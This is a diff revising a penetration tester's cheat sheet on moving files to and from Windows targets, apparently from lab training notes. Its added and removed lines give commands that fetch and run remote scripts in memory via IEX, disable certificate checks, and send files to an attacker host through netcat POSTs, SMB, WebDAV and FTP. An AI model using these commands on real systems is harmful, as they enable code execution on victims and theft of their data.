@@ -1,189 +1,155 @@
-## PowerShell Web Downloads
+# Windows File Transfer Methods
 
-Standard outbound traffic is permitted via HTTP/HTTPS, but local execution policies or web filters may restrict binary downloads.
+## Download to Windows
 
-Standard download to disk using WebClient
+Base64 encode on Linux, decode on Windows — no network needed if you have console access:
 
-```
-(New-Object Net.WebClient).DownloadFile('http://<ATTACK_IP>/<FILE_NAME>', 'C:\<FILE_PATH>')
-```
-
-Asynchronous download to prevent blocking the calling thread
-
-```
-(New-Object Net.WebClient).DownloadFileAsync('http://<ATTACK_IP>/<FILE_NAME>', 'C:\<FILE_PATH>')
+```bash
+md5sum <FILE> && cat <FILE> | base64 -w 0; echo
 ```
 
-Fileless execution by downloading script string directly to memory
+Paste the blob into PowerShell:
 
-```
-IEX (New-Object Net.WebClient).DownloadString('http://<ATTACK_IP>/<FILE_NAME>.ps1')
-```
-
-Alternative fileless execution using pipeline input
-
-```
-(New-Object Net.WebClient).DownloadString('http://<ATTACK_IP>/<FILE_NAME>.ps1') | IEX
+```powershell
+[IO.File]::WriteAllBytes("<OUTPATH>", [Convert]::FromBase64String("<BASE64_BLOB>"))
+Get-FileHash <OUTPATH> -Algorithm md5
 ```
 
-Standard cmdlet download for PowerShell 3.0+
+> [!warning] cmd.exe max string length is 8191 chars. Web shells choke on large blobs. Base64 method only for small files.
 
+Download to disk via WebClient:
+
+```powershell
+(New-Object Net.WebClient).DownloadFile('<URL>', '<OUTFILE>')
 ```
-Invoke-WebRequest http://<ATTACK_IP>/<FILE_NAME> -OutFile <FILE_NAME>
+
+Fileless — run directly in memory, nothing touches disk:
+
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('<URL>')
 ```
 
-- Net.WebClient -> `(New-Object Net.WebClient).DownloadFile` -> Prefer for speed and compatibility with older PowerShell versions.
-    
-- Invoke-WebRequest -> `iwr <URL> -OutFile <PATH>` -> Prefer when aliases (curl/wget) are needed, though it is noticeably slower.
-    
-- **Internet Explorer engine unavailable**: The first-launch configuration must be completed or the engine is missing.
-    
-- **SSL/TLS trust failure**: The certificate is not trusted by the local store.
-    
+`Invoke-WebRequest` works but is slower — aliases: `iwr`, `curl`, `wget`:
 
-1. Use `-UseBasicParsing` to bypass IE engine requirements.
-2. Set the `ServicePointManager` callback to true to ignore SSL errors.
-
+```powershell
+Invoke-WebRequest <URL> -OutFile <OUTFILE>
 ```
+
+IE first-launch error → add `-UseBasicParsing`:
+
+```powershell
+Invoke-WebRequest <URL> -UseBasicParsing | IEX
+```
+
+Untrusted cert error → bypass SSL validation before the download call:
+
+```powershell
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 ```
 
-**Internet Explorer setup incomplete** will block `Invoke-WebRequest` unless basic parsing is specified.
+SMB download — unauthenticated (older Windows):
+
+```bash
+sudo impacket-smbserver share -smb2support /tmp/smbshare
+```
+
+```cmd
+copy \\<LHOST>\share\<FILE>
+```
+
+Guest access blocked → add creds to the server and mount first:
+
+```bash
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user <USER> -password <PASS>
+```
+
+```cmd
+net use n: \\<LHOST>\share /user:<USER> <PASS>
+copy n:\<FILE>
+```
+
+FTP download via WebClient:
+
+```bash
+sudo python3 -m pyftpdlib --port 21
+```
+
+```powershell
+(New-Object Net.WebClient).DownloadFile('ftp://<LHOST>/<FILE>', '<OUTFILE>')
+```
+
+Non-interactive FTP (no shell, cmd only) — script the commands:
+
+```cmd
+echo open <LHOST> > ftpcommand.txt & echo USER anonymous >> ftpcommand.txt & echo binary >> ftpcommand.txt & echo GET <FILE> >> ftpcommand.txt & echo bye >> ftpcommand.txt & ftp -v -n -s:ftpcommand.txt
+```
 
 ---
 
-## SMB File Transfer
+## Upload from Windows
 
-The environment allows TCP/445 traffic or lacks restrictions on internal lateral file movement.
+Base64 encode on Windows, decode on Linux:
 
-Initialize SMB server on attack host
-
-```
-sudo impacket-smbserver <SHARE_NAME> -smb2support <FILE_PATH>
-```
-
-Copy file from share to target current directory
-
-```
-copy \\<ATTACK_IP>\<SHARE_NAME>\<FILE_NAME>
+```powershell
+[Convert]::ToBase64String((Get-Content -Path '<FILE>' -Encoding Byte))
+Get-FileHash '<FILE>' -Algorithm MD5 | select Hash
 ```
 
-Mount share with credentials to bypass unauthenticated guest restrictions
-
-```
-net use n: \\<ATTACK_IP>\<SHARE_NAME> /user:<USERNAME> <PASSWORD>
-```
-
-**Unauthenticated guest access blocked** by security policy on newer Windows versions requires providing credentials during share creation and mounting.
-
----
-
-## FTP File Transfer
-
-TCP/21/20 are reachable and native FTP clients are available on the target.
-
-Start anonymous FTP server with write permissions
-
-```
-sudo python3 -m pyftpdlib --port 21 --write
+```bash
+echo <BASE64_BLOB> | base64 -d -w 0 > <OUTFILE>
+md5sum <OUTFILE>
 ```
 
-Download file using PowerShell WebClient
+HTTP upload — start uploadserver on attack host, pull PSUpload.ps1 and fire:
 
-```
-(New-Object Net.WebClient).DownloadFile('ftp://<ATTACK_IP>/<FILE_NAME>', 'C:\<FILE_PATH>')
-```
-
-Automated non-interactive FTP download via command file
-
-```
-echo open <ATTACK_IP> > ftpcommand.txt && echo USER anonymous >> ftpcommand.txt && echo binary >> ftpcommand.txt && echo GET <FILE_NAME> >> ftpcommand.txt && echo bye >> ftpcommand.txt && ftp -v -n -s:ftpcommand.txt
-```
-
-- **Anonymous write access enabled**: pyftpdlib defaults to anonymous; ensure `--write` is specified for uploads.
-
----
-
-## WebDAV Transfer (SMB over HTTP)
-
-Outbound TCP/445 is blocked by firewalls, causing SMB to attempt a failover connection via HTTP.
-
-Start WebDAV server on attack host
-
-```
-sudo wsgidav --host=0.0.0.0 --port=80 --root=<FILE_PATH> --auth=anonymous
-```
-
-Connect to the root of the WebDAV server
-
-```
-dir \\<ATTACK_IP>\DavWWWRoot
-```
-
-Copy to a specific folder existing on the WebDAV server
-
-```
-copy <FILE_PATH> \\<ATTACK_IP>\<SHARE_NAME>\
-```
-
-`DavWWWRoot` is a mandatory keyword for the Mini-Redirector driver when connecting to the server root.
-
----
-
-## Base64 Terminal Transfer
-
-No network communication is possible, but terminal access is available for copy-pasting strings.
-
-Encode file on Linux for transfer
-
-```
-cat <FILE_NAME> | base64 -w 0; echo
-```
-
-Decode string on Windows target to file
-
-```
-[IO.File]::WriteAllBytes("<FILE_PATH>", [Convert]::FromBase64String("<BASE64_STRING>"))
-```
-
-Encode file on Windows for exfiltration
-
-```
-[Convert]::ToBase64String((Get-Content -path "<FILE_PATH>" -Encoding byte))
-```
-
-Verify transfer integrity using MD5 hashes.
-
-```
-Get-FileHash <FILE_PATH> -Algorithm md5
-```
-
-**CMD string length limit** of 8,191 characters will truncate large transfers in `cmd.exe`.
-
----
-
-## Web Upload Operations
-
-Exfiltration is required over HTTP/HTTPS to a controlled server.
-
-Start upload-capable web server
-
-```
+```bash
 python3 -m uploadserver
 ```
 
-Upload via PowerShell script using Invoke-RestMethod
-
-```
-IEX(New-Object Net.WebClient).DownloadString('http://<ATTACK_IP>/PSUpload.ps1'); Invoke-FileUpload -Uri http://<ATTACK_IP>:8000/upload -File <FILE_PATH>
-```
-
-Exfiltrate file as Base64 POST request to Netcat
-
-```
-$b64 = [System.convert]::ToBase64String((Get-Content -Path '<FILE_PATH>' -Encoding Byte)); Invoke-WebRequest -Uri http://<ATTACK_IP>:<PORT>/ -Method POST -Body $b64
+```powershell
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+Invoke-FileUpload -Uri http://<LHOST>:8000/upload -File <FILE>
 ```
 
-> ⚠️ Gap: The `PSUpload.ps1` script is not a native utility and must be pre-staged or downloaded from an external repository which may be blocked.
+Base64 POST to netcat listener — no upload server needed:
 
-**Web shell limitations** may cause errors when attempting to send extremely large strings via POST or terminal.
+```powershell
+$b64 = [System.convert]::ToBase64String((Get-Content -Path '<FILE>' -Encoding Byte))
+Invoke-WebRequest -Uri http://<LHOST>:8000/ -Method POST -Body $b64
+```
+
+```bash
+nc -lvnp 8000
+# grab the blob from POST body then:
+echo <BASE64_BLOB> | base64 -d -w 0 > <OUTFILE>
+```
+
+SMB upload — if TCP/445 is blocked outbound, run SMB over HTTP via WebDAV:
+
+```bash
+sudo pip3 install wsgidav cheroot
+sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
+```
+
+```cmd
+copy <FILE> \\<LHOST>\DavWWWRoot\
+copy <FILE> \\<LHOST>\<SHARENAME>\
+```
+
+> [!tip] `DavWWWRoot` is a magic keyword — the Windows shell uses it to connect to the WebDAV root. No folder named that needs to exist on your server. Use a real subfolder name instead if you want to avoid it.
+
+FTP upload — `--write` flag required, anonymous upload enabled by default:
+
+```bash
+sudo python3 -m pyftpdlib --port 21 --write
+```
+
+```powershell
+(New-Object Net.WebClient).UploadFile('ftp://<LHOST>/<OUTFILE>', '<FILE>')
+```
+
+Non-interactive FTP upload:
+
+```cmd
+echo open <LHOST> > ftpcommand.txt & echo USER anonymous >> ftpcommand.txt & echo binary >> ftpcommand.txt & echo PUT <FILE> >> ftpcommand.txt & echo bye >> ftpcommand.txt & ftp -v -n -s:ftpcommand.txt
+```
